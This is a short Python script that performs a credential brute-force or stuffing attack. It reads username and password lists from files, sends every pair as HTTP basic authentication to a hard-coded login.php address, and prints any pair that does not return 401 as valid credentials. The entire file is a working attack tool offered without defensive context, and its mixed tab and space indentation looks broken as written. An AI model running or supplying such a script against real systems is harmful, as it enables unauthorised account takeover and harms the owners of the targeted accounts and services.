import requests 

username_file = open('user.txt')
password_file = open('password.txt')

user_list = username_file.readlines()
password_list = password_file.readlines()

def tryAuthentication(url, username, password):
    r = requests.get(url, auth=(username, password))
	if str(r.status_code) != '401':
		print("\n" + "!!!!!" + " Valid credentials found ==> " + "\nUsername: " + username + "\nPassword: " + password)
		exit()
		
for user in user_list:
    user = user.rstrip()
    for password in password_list:
        password = password.rstrip()
        
        print("Stuffing: " + "Username -> " + user + " | " + "Password -> " + password)

        tryAuthentication("http://13.13.13.13/login.php", user, password)